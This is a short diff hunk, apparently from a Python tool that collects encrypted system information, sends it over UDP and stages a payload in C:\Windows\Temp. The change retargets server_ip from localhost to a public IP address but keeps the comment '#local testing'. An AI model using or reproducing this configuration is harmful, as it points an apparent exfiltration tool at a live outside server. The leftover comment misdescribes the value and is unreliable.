@@ -29,7 +29,7 @@ systemInfoEncrypted = "systemInfoEncrypted.txt"
 ## Networking Variables
 udpPort = 25005
 buffer_size = 1024
-server_ip = "127.0.0.1" #local testing
+server_ip = "35.231.244.179" #local testing
 
 # payload destination variables
 path = "C:\Windows\Temp"
